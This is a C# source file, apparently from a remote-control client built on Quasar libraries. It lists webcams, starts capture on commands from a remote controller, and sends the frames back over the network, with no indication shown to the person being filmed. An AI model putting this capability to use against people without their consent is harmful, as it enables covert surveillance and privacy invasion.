using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using AForge.Video;
using AForge.Video.DirectShow;
using Quasar.Common.Messages;
using Quasar.Common.Video;
using xClient.Core.Networking;

namespace xClient.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT HANDLE WEBCAM COMMANDS. */

    public static partial class CommandHandler
    {
        public static bool WebcamStarted;
        public static bool NeedsCapture;
        public static Client Client;
        public static int Webcam;
        public static int Resolution;
        public static VideoCaptureDevice FinalVideo;

        public static void HandleGetWebcams(GetWebcams command, Client client)
        {
            var deviceInfo = new Dictionary<string, List<Resolution>>();
            var videoCaptureDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
            foreach (FilterInfo videoCaptureDevice in videoCaptureDevices)
            {
                List<Size> supportedResolutions = new List<Size>();
                var device = new VideoCaptureDevice(videoCaptureDevice.MonikerString);
                foreach (var resolution in device.VideoCapabilities)
                {
                    supportedResolutions.Add(resolution.FrameSize);
                }
                List<Resolution> res = new List<Resolution>(supportedResolutions.Count);
                foreach (var r in supportedResolutions)
                    res.Add(new Resolution {Height = r.Height, Width = r.Width});

                deviceInfo.Add(videoCaptureDevice.Name, res);
            }

            if (deviceInfo.Count > 0)
                client.Send(new GetWebcamsResponse {Webcams = deviceInfo});
        }

        public static void HandleGetWebcam(GetWebcam command, Client client)
        {
            Client = client;
            NeedsCapture = true;
            Webcam = command.Webcam;
            Resolution = command.Resolution;
            if (!WebcamStarted)
            {
                var videoCaptureDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                FinalVideo = new VideoCaptureDevice(videoCaptureDevices[command.Webcam].MonikerString);
                FinalVideo.NewFrame += FinalVideo_NewFrame;
                FinalVideo.VideoResolution = FinalVideo.VideoCapabilities[command.Resolution];
                FinalVideo.Start();
                WebcamStarted = true;
            }
        }

        public static void HandleDoWebcamStop(DoWebcamStop command, Client client)
        {
            NeedsCapture = false;
            WebcamStarted = false;
            Client = null;
            if (FinalVideo != null)
            {
                FinalVideo.NewFrame -= FinalVideo_NewFrame;
                FinalVideo.Stop();
                FinalVideo = null;
            }
        }

        private static void FinalVideo_NewFrame(object sender, NewFrameEventArgs e)
        {
            if (!WebcamStarted)
                FinalVideo.Stop();

            if (NeedsCapture)
            {
                var image = (Bitmap) e.Frame.Clone();
                using (var stream = new MemoryStream())
                {
                    image.Save(stream, ImageFormat.Bmp);
                    Client.Send(new GetWebcamResponse
                    {
                        Image = stream.ToArray(),
                        Webcam = Webcam,
                        Resolution = Resolution
                    });
                    stream.Close();
                }
                NeedsCapture = false;
            }
        }
    }
}